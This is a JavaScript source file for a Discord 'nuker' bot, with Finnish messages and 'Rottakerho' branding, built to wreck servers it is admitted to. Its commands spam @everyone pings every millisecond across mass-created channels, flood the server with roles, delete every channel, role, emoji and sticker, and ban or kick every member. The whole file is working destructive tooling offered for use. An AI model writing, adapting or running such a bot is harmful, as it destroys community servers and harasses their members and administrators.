/**
 * 
 * @author [Prefo]#6312
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, discordID, voiksjokumuu } = require("../config/config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(red(`
    
    ██████╗░░█████╗░████████╗████████╗░█████╗░██╗░░██╗███████╗██████╗░██╗░░██╗░█████╗░
    ██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗██║░░██║██╔══██╗
    ██████╔╝██║░░██║░░░██║░░░░░░██║░░░███████║█████═╝░█████╗░░██████╔╝███████║██║░░██║
    ██╔══██╗██║░░██║░░░██║░░░░░░██║░░░██╔══██║██╔═██╗░██╔══╝░░██╔══██╗██╔══██║██║░░██║
    ██║░░██║╚█████╔╝░░░██║░░░░░░██║░░░██║░░██║██║░╚██╗███████╗██║░░██║██║░░██║╚█████╔╝
    ╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░
                                                      
                            TESTI
                    MIKÄS BOTTI NUKETTAA? : ${nuker.user.tag}
                    BOTIN PREFIx: ${prefix}
    `))
    nuker.user.setActivity({ name: "Rottakerho", type: "WATCHING" });
});

nuker.on("messageCreate", (message) => {

    const help = new MessageEmbed()
        .setDescription(`**ROTTAKERHO ;**
    \n**Massa kannut ;**
    ${prefix}mc [määrä] (kannun nimi) \`${prefix}mc 5 testi\`\n
    **massa kannut ja sit tägi ;**
    ${prefix}cp [määrä] (kannun nimi), {viesti} \`${prefix}cp 5 testi, testi\`\n
    **massa roolit roles ;**
    ${prefix}mr [määrä] (roolin nimi) \`${prefix}mr 5 testi\`\n
    **poistaa kannut ;**
    ${prefix}dc\n
    **poistaa roolit ;**
    ${prefix}dr\n
    **poistaa emojit ;**
    ${prefix}de\n
    **poistaa tarrat ;**
    ${prefix}ds\n
    **massa potkut perseeesee ;**
    ${prefix}mk\n
    **massa banaanit pyllyy uh ah ;**
    ${prefix}mb
    `)
        .setFooter(`© ROTTAKERHO HALLITSEE`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; 
    var args2 = args.slice(1).join(' ') 
    var args3 = args.slice(2).join(', '); 

    if (!voiksjokumuu) {

        if (message.content.startsWith(prefix + "help")) {
            message.channel.send({embeds: [help]})
        }

        if (message.content.startsWith(prefix + "mc")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dc")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "cp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mr")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dr")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }


        if (message.content.startsWith(prefix + "ds")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }


        if (message.content.startsWith(prefix + "de")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }


        if (message.content.startsWith(prefix + "mb")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }


        if (message.content.startsWith(prefix + "mk")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {

        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != discordID) return message.reply("Sinulla ei ole oikeuksia käyttää tätä komentoa.");
            message.channel.send({embeds: [help]})
        }

        if (message.content.startsWith(prefix + "mc")) {
            if (message.author.id != discordID) return message.reply("Sinulla ei ole oikeuksia käyttää tätä komentoa.");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dc")) {
            if (message.author.id != discordID) return message.reply("Sinulla ei ole oikeuksia käyttää tätä komentoa.");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "cp")) {
            if (message.author.id != discordID) return message.reply("Sinulla ei ole oikeuksia käyttää tätä komentoa.");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mr")) {
            if (message.author.id != discordID) return message.reply("Sinulla ei ole oikeuksia käyttää tätä komentoa.");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dr")) {
            if (message.author.id != discordID) return message.reply("Sinulla ei ole oikeuksia käyttää tätä komentoa.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "ds")) {
            if (message.author.id != discordID) return message.reply("Sinulla ei ole oikeuksia käyttää tätä komentoa.");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "de")) {
            if (message.author.id != discordID) return message.reply("Sinulla ei ole oikeuksia käyttää tätä komentoa.");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mb")) {
            if (message.author.id != discordID) return message.reply("Sinulla ei ole oikeuksia käyttää tätä komentoa.");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mk")) {
            if (message.author.id != discordID) return message.reply("Sinulla ei ole oikeuksia käyttää tätä komentoa.");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }



    /**
     * 
     * @param {number} amount 
     * @param {string} channelName 
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Määrittelemätön argumentti: laita määrä, jonka haluat massakanaville");
            if (isNaN(amount)) return reject("Tyyppivirhe: Käytä lukua määrässä");
            if (amount > 500) return reject("Määrävirhe: kannujen enimmäiskoko on 500 | Vinkki: Käytä lukua, joka on alle 500");
            if (!channelPerms) return reject("Botilt puuttuu permiii: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} kävi täällä`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("onkelma löyty: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("onkelma löyty: " + err)) })
                }
            }
            resolve();
        });
    }

    /**
     *
     * @param {number} amount 
     * @param {string} channelName 
     * @param {string} pingMessage 
     */
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Määrittelemätön argumentti: laita määrä, jonka haluat massakanaville");
            if (isNaN(amount)) return reject("Tyyppivirhe: Käytä lukua määrässä");
            if (amount > 500) return reject("Määrävirhe: kannujen enimmäiskoko on 500 | Vinkki: Käytä lukua, joka on alle 500");
            if (!channelPerms) return reject("Botilt puuttuu permiii: 'MANAGE_CHANNELS'");
            if (!pingMessage) return reject("Määrittelemätön argumentti: Määritä viesti, jonka haluat maininnan jälkeen");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} kävi täällä`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("onkelma löyty: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("onkelma löyty: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1); 
                    });
                }
            }
            resolve();
        });
    }


    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Botilt puuttuu permiii: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("onkelma löyty: " + err)) }))
            resolve();
        });
    }

    /**
     * 
     * @param {number} amount 
     * @param {string} roleName 
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Määrittelemätön argumentti: Määritä määrä, jonka haluat massarooleihin");
            if (isNaN(amount)) return reject("Tyyppivirhe: Käytä lukua määrässä");
            if (!rolePerms) return reject("Botilt puuttuu permiii: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuketettu", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("onkelma löyty: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("onkelma löyty: " + err)) })
                }
            }
        })
    }


    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Botilt puuttuu permiii: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("onkelma löyty: " + err)) }))
        });
    }

    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Botilt puuttuu permiii: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("onkelma löyty: " + err)) }))
        });
    }

    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Botilt puuttuu permiii: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("onkelma löyty: " + err)) }))
        });
    }


    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Botilt puuttuu permiii: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("löyty " + arrayOfIDs.length + " jäsentä.").then((msg) => {
                setTimeout(() => {
                    msg.edit("bännätään...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("onkelma löyty: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} bännättiin.`)) });
                    }
                }, 2000);
            })
        })
    }


    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Botilt puuttuu permiii: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("löyty " + arrayOfIDs.length + " jäsentä.").then((msg) => {
                setTimeout(() => {
                    msg.edit("potkitaan...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("onkelma löyty: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} potkittiin.`)) });
                    }
                }, 2000);
            })
        })
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
